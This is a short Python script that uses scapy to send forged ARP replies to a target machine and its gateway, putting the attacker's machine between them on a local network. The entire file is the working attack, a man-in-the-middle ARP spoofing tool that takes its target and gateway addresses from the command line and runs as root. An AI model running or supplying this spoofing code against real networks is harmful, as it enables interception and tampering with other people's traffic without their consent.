from scapy.all import ARP,Ether,sendp
import uuid
import socket
from sys import argv
import time

script,target_ip,target_mac,gateaway_ip,gateaway_mac = argv


def get_mac_adress():
    mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
    mac_adress = ":".join([mac[e:e+2] for e in range(0,11,2)])
    print(mac_adress
          )
    return mac_adress

def get_ip_adress():
    hostname = socket.gethostname()
    host_ip = socket.gethostbyname(hostname)
    return host_ip

def spoof(target_ip,target_mac,gateaway_ip,gateaway_mac,host_ip,host_mac):
    arp_reply_target = Ether(dst=target_mac)/ARP(op=2,pdst = target_ip,hwdst=target_mac,psrc=gateaway_ip,hwsrc=host_mac)
    arp_reply_target2 = Ether(dst=target_mac)/ARP(op=2,pdst = target_ip,hwdst=target_mac,psrc=host_ip,hwsrc=gateaway_mac)
    arp_reply_gateaway = Ether(dst=gateaway_mac)/ARP(op=2, pdst = gateaway_ip,hwdst=gateaway_mac,psrc=target_ip,hwsrc=host_mac)

    sendp(arp_reply_target,iface="eth0")
    sendp(arp_reply_gateaway,iface="eth0")
    sendp(arp_reply_target2,iface="eth0")

try:
    host_mac=get_mac_adress()
    host_ip=get_ip_adress()
    spoof(target_ip,target_mac,gateaway_ip,gateaway_mac,host_ip,host_mac)
except PermissionError:
    print("Attention, are you root !?? :)")
